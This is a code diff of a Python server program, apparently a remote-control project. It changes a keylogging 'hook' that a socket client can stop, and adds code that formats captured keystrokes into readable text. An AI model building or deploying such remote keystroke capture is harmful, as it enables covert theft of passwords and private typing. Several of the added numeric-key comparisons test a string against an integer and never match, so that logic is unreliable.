@@ -70,6 +70,8 @@ def Server_Running():
             return 1
         except:
             return 0
+
+            
     def hook():
         from threading import Thread
         import threading
@@ -86,8 +88,7 @@ def Server_Running():
                     while True:                       
                         check = client.recv(1024).decode("utf8")
                         print(check)
-                        if check == "Unhook Key":  
-                                                 
+                        if check == "Unhook Key" or check =="Xem key":                 
                             KeyStop = False
                             break
                 finally:
@@ -108,10 +109,51 @@ def Server_Running():
                 count = 0
                 keylog = ''
                 for key in keys:
-
                     k = str(key).replace("'","")
-                    #if( k == "Key.shift" or k == "")
-                        #k=""
+                    if(str(k) == "Key.backspace"):
+                        k = "Backspace"
+                    elif(str(k) == "Key.space"):
+                        k = " "                
+                    k = str(k).replace("Key.cmd","")                    
+                    k = str(k).replace("Key.","")
+                    k = str(k).replace("<","")
+                    k = str(k).replace(">","")
+                    if(str(k) == 96):
+                        k = "0"
+                    elif(str(k) == 97):
+                        k = "1"
+                    elif(str(k) == 98):
+                        k = "2"
+                    elif(str(k) == 99):
+                        k = "3"
+                    elif(str(k) == 100):
+                        k = "4"
+                    elif(str(k) == 101):
+                        k = "5"
+                    elif(str(k) == 102):
+                        k = "6"
+                    elif(str(k) == 103):
+                        k = "7"
+                    elif(str(k) == 104):
+                        k = "8"
+                    elif(str(k) == 105):
+                        k = "9"
+                    k = str(k).replace("cmd","fn")
+                    k = str(k).replace("enter","Enter")
+                    k = str(k).replace("tab","")
+                    k = str(k).replace("esc","ESC")
+                    k = str(k).replace("num_lock","")
+                    k = str(k).replace("caps_lock","")
+                    k = str(k).replace("shift_l","")
+                    k = str(k).replace("shift_r","")
+                    k = str(k).replace("ctrl_l","")
+                    k = str(k).replace("ctrl_r","")
+                    k = str(k).replace("alt_l","")
+                    k = str(k).replace("alt_gr","")
+                    k = str(k).replace("delete","Del")
+                    k = str(k).replace("print_screen","PrtSc")
+                    k = str(k).replace("home","Home")
+
                     keylog += k
                     count+=1
                 return keylog[0:]
